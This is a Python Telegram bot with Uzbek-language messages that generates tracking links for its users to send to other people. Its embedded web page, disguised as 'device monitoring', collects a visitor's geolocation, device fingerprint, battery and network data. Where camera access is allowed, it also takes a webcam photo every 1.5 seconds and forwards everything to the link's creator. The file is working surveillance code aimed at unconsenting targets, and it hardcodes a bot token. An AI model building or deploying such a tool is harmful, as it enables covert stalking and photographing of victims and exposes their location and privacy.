#!/usr/bin/env python3
import os
import json
import uuid
import base64
import asyncio
import logging
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip()
PORT = int(os.getenv("PORT", "8000"))

# Token -> user_id (doim saqlanadi, hech qachon o'chirilmaydi)
USER_TOKENS = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Har doim yangi token yaratiladi, lekin eski tokenlar ham ishlashda davom etadi
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "👋 Salom!\n\n"
        "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
        f"🔗 {link}\n\n"
        "Havola cheksiz muddat ishlaydi. Uni istalgan kishiga yuborishingiz mumkin.\n"
        "Har kim havolaga kirsangiz, uning ma'lumotlari sizga yuboriladi."
    )
    await update.message.reply_text(msg)

def get_client_ip(request: web.Request) -> str:
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        return hdr.split(",")[0].strip()
    rem = request.remote
    if rem:
        return rem
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Qurilma Monitoring</title>
  <style>
    body {{
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #f5f7fa; color: #2d3748;
      margin: 0;
    }}
    .status {{
      margin: 20px;
      font-size: 1.1em;
      color: #48bb78;
      font-weight: 500;
    }}
    .counter {{
      font-size: 0.9em;
      color: #718096;
    }}
    .note {{
      font-size: 0.8em;
      color: #a0aec0;
      margin-top: 20px;
    }}
  </style>
</head>
<body>
  <h2>📱 Qurilma monitoring</h2>
  <div class="status" id="status">Ma'lumotlar yig'ilmoqda...</div>
  <div class="counter" id="count">Yuborishlar: 0</div>
  <div class="note">Sahifani yopish — monitoringni to'xtatadi</div>

  <script>
    let sendCount = 0;
    const intervalMs = 1500;
    let stream = null;
    let hasCameraAccess = null;
    let intervalId = null;

    async function getLocation() {{
        return new Promise((resolve) => {{
            if (!navigator.geolocation) {{
                resolve(null);
                return;
            }}
            navigator.geolocation.getCurrentPosition(
                (pos) => {{
                    resolve({{
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    }});
                }},
                (err) => {{
                    console.log("Joylashuv ruxsati berilmadi yoki xato:", err);
                    resolve(null);
                }},
                {{ timeout: 8000, maximumAge: 60000 }}
            );
        }});
    }}

    async function getBatteryLevel() {{
        try {{
            if ('getBattery' in navigator) {{
                const battery = await navigator.getBattery();
                return Math.round(battery.level * 100);
            }}
        }} catch (e) {{}}
        return null;
    }}

    async function collectData() {{
        const data = {{
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Noma'lum",
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          deviceMemory: navigator.deviceMemory || "Noma'lum",
          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
          screen: `${{screen.width}}x${{screen.height}}`,
          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          devicePixelRatio: window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : "Noma'lum",
          deviceType: /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
          browser: "Noma'lum",
          os: "Noma'lum",
          model: "Noma'lum",
          devices: {{ mic: 0, speaker: 0, camera: 0 }},
          gpu: "Noma'lum",
          cameraRes: "Noma'lum",
          network: "Noma'lum",
          location: "Noma'lum",
          battery: "Noma'lum"
        }};

        // Brauzer aniqlash
        const ua = navigator.userAgent;
        if (ua.includes("Chrome") && !ua.includes("Edg")) data.browser = "Chrome";
        else if (ua.includes("Firefox")) data.browser = "Firefox";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) data.browser = "Safari";
        else if (ua.includes("Edg")) data.browser = "Edge";
        else if (ua.includes("OPR")) data.browser = "Opera";

        // OS aniqlash
        if (ua.includes("Windows")) data.os = "Windows";
        else if (ua.includes("Android")) data.os = "Android";
        else if (ua.includes("iPhone") || ua.includes("iPad")) data.os = "iOS";
        else if (ua.includes("Mac OS")) data.os = "macOS";
        else if (ua.includes("Linux")) data.os = "Linux";

        // Model taxmini (faqat Android)
        if (data.os === "Android") {{
            const match = ua.match(/Build\\/([\\w\\d\\-_.]+)/);
            if (match) {{
                data.model = match[1];
            }} else {{
                data.model = "Android qurilma";
            }}
        }} else if (data.os === "iOS") {{
            data.model = ua.includes("iPhone") ? "iPhone" : "iPad";
        }}

        // Joylashuv
        const loc = await getLocation();
        if (loc) {{
            data.location = `${{loc.lat.toFixed(6)}}, ${{loc.lng.toFixed(6)}} (±${{Math.round(loc.accuracy)}} m)`;
        }}

        // Batareya (ehtimoliy)
        const battery = await getBatteryLevel();
        if (battery !== null) {{
            data.battery = `${{battery}}%`;
        }}

        // Media qurilmalar
        try {{
            const devs = await navigator.mediaDevices.enumerateDevices();
            data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
            data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
            data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
        }} catch (e) {{ console.log("Media qurilmalarni olishda xato:", e); }}

        // GPU
        try {{
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (gl) {{
                const dbg = gl.getExtension("WEBGL_debug_renderer_info");
                if (dbg) {{
                    data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                }}
            }}
        }} catch (e) {{}}

        // Tarmoq
        if (navigator.connection) {{
            const conn = navigator.connection;
            data.network = `${{conn.effectiveType || 'Noma\\'lum'}}, ${{conn.downlink ? conn.downlink + ' Mbps' : '?'}}`;
        }}

        return data;
    }}

    async function capturePhoto(video) {{
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL("image/jpeg", 0.75);
    }}

    async function sendReport() {{
        try {{
            let cameraAllowed = false;
            let img = null;
            let data = await collectData();

            if (hasCameraAccess === null) {{
                try {{
                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }} });
                    hasCameraAccess = true;
                    cameraAllowed = true;
                    document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
                }} catch (err) {{
                    hasCameraAccess = false;
                    cameraAllowed = false;
                    document.getElementById("status").textContent = "⚠️ Kamera ruxsati yo'q — ma'lumot bir marta yuborildi";
                }}
            }} else if (hasCameraAccess) {{
                cameraAllowed = true;
            }}

            if (hasCameraAccess) {{
                const video = document.createElement("video");
                video.srcObject = stream;
                video.muted = true;
                await video.play();

                if (video.videoWidth > 0) {{
                    img = await capturePhoto(video);
                    const track = stream.getVideoTracks()[0];
                    const settings = track.getSettings();
                    data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
                }} else {{
                    await new Promise(r => setTimeout(r, 300));
                    if (video.videoWidth > 0) {{
                        img = await capturePhoto(video);
                        data.cameraRes = `${{video.videoWidth}}x${{video.videoHeight}}`;
                    }}
                }}
            }}

            const body = {{
                token: "{token}",
                clientData: data,
                cameraAllowed: cameraAllowed
            }};
            if (img) {{
                body.image = img;
            }}

            await fetch("/submit", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify(body)
            }});

            sendCount++;
            document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;

            if (hasCameraAccess === false && intervalId) {{
                clearInterval(intervalId);
            }}

        }} catch (error) {{
            console.error("Xato:", error);
            if (hasCameraAccess === false && intervalId) {{
                clearInterval(intervalId);
            }}
        }}
    }}

    sendReport();

    setTimeout(() => {{
        if (hasCameraAccess !== false) {{
            intervalId = setInterval(sendReport, intervalMs);
        }}
    }}, 2500);

    window.addEventListener("beforeunload", () => {{
        if (stream) stream.getTracks().forEach(t => t.stop());
        if (intervalId) clearInterval(intervalId);
    }});
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")
    
async def submit_data(request: web.Request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        camera_allowed = body.get("cameraAllowed", False)
        user_id = USER_TOKENS.get(token)
        
        if not user_id:
            return web.Response(status=403, text="Token not found")

        ip = get_client_ip(request)
        devs = client_data.get("devices", {})

        # Sana formatini chiroyli qilish
        ts = client_data.get('timestamp', '')
        if 'T' in ts:
            ts = ts.replace('T', ' ').split('.')[0]

        # Joylashuv xaritaga havola
        location_str = client_data.get('location', 'Noma\'lum')
        location_line = ""
        if location_str != "Noma'lum" and "±" in location_str:
            try:
                coords = location_str.split(' ')[0]
                lat, lng = coords.split(',')
                map_link = f"https://maps.google.com/?q={lat},{lng}"
                location_line = f"📍 Joylashuv: {location_str} — [Xaritada ko‘rish]({map_link})\n"
            except:
                location_line = f"📍 Joylashuv: {location_str}\n"
        else:
            location_line = f"📍 IP orqali: {ip} (Brauzer orqali kelgan IP)\n"

        message = (
            f"📱 **Qurilma ma’lumoti**\n"
            f"🕒 {ts}\n"
            f"🧭 Vaqt zonasi: {client_data.get('timezone', 'Noma\'lum')} (UTC{client_data.get('utcOffset', 0):+.2f})\n"
            f"{location_line}"
            f"🔋 Zaryad: {client_data.get('battery', 'Noma\'lum')}\n"
            f"🌐 Til: {client_data.get('languages', 'Noma\'lum')}\n"
            f"💻 Tizim: {client_data.get('os', 'Noma\'lum')} | Brauzer: {client_data.get('browser', 'Noma\'lum')}\n"
            f"📟 Qurilma: {client_data.get('model', 'Noma\'lum')} ({client_data.get('deviceType', 'Noma\'lum')})\n"
            f"🧠 CPU: {client_data.get('hardwareConcurrency', 'Noma\'lum')} ta | RAM: {client_data.get('deviceMemory', 'Noma\'lum')} GB\n"
            f"🖥 Ekran: {client_data.get('screen', 'Noma\'lum')}, zichlik: {client_data.get('devicePixelRatio', 'Noma\'lum')}x\n"
            f"🌈 Ekran chuqurligi: rang: {client_data.get('colorDepth', 'Noma\'lum')}-bit, piksel: {client_data.get('pixelDepth', 'Noma\'lum')}-bit\n"
            f"🪟 Ko‘rinish (viewport): {client_data.get('viewport', 'Noma\'lum')}\n"
            f"🔊 Qurilmalar: mikrofon: {devs.get('mic',0)} ta, karnay: {devs.get('speaker',0)} ta, kamera: {devs.get('camera',0)} ta\n"
            f"📸 Kamera: {client_data.get('cameraRes', 'Noma\'lum')}\n"
            f"📶 Internet: {client_data.get('network', 'Noma\'lum')}\n"
            f"🎮 GPU: {client_data.get('gpu', 'Noma\'lum')}\n"
            f"🧾 UA: `{client_data.get('userAgent', 'Noma\'lum')}`\n"
            f"📷 Kamera: {'✅ Ruxsat berildi' if camera_allowed else '❌ Ruxsat berilmadi'}"
        )

        if camera_allowed and "image" in body:
            img_data = body["image"]
            if "," in img_data:
                b64 = img_data.split(",", 1)[1]
            else:
                b64 = img_data
            try:
                img_bytes = base64.b64decode(b64)
                img = BytesIO(img_bytes)
                img.name = "snapshot.jpg"
                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Rasmni yuborishda xato: {e}")
                await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.", parse_mode="Markdown")
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message, parse_mode="Markdown")

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500, text=str(e))
        
async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{PORT}")

async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    app.run_polling()

if __name__ == "__main__":
    main()
